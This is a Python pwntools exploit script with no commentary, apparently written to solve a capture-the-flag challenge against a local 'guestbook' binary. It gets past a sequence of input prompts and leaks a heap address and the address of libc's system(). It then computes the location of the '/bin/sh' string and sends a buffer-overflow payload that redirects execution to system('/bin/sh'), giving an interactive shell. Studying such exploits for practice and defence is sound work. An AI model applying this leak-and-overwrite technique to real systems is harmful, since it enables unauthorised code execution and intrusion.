from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
target = process('./guestbook', env={"LD_PRELOAD":"./libc.so.6"})
# target = process('./guestbook')
# gdb.attach(target)

def start():
    print(target.recvuntil(">>>"))
    target.sendline("15935")
    print(target.recvuntil(">>>"))
    target.sendline("75395")
    print(target.recvuntil(">>>"))
    target.sendline("01593")
    print(target.recvuntil(">>>"))
    target.sendline("25319")

def calc_binsh(system_adr):
    binsh = system_adr + 0x179d02
    log.info("The address of /bin/sh is: " + hex(binsh))
    return binsh

def attack(system, binsh, heap):
    # target.recvuntil(">>")
    target.sendline("2")
    target.recvuntil(">>>")
    target.sendline("0")
    target.recvuntil(">>>")
    payload = b"0"*0x4 + b"\x00" + b"1"*0x5f + p32(0x0) + b"2"*0x4 + p32(heap) + b"3"*0x2c + p32(system) + b"4"*0x4 + p32(binsh)
    target.sendline(payload)

start()
print(target.recvuntil(">>"))
target.sendline("1")
print(target.recvuntil(">>>"))
target.sendline("6")
leak = target.recv(24)
heap_adr = u32(leak[0:4])
system_adr = u32(leak[20:24])
print(target.recvuntil(">>"))
log.info("The address of system is: " + hex(system_adr))
log.info("The heap address of first guest name is: " + hex(heap_adr))

binsh = calc_binsh(system_adr)
attack(system_adr, binsh, heap_adr)

target.interactive()

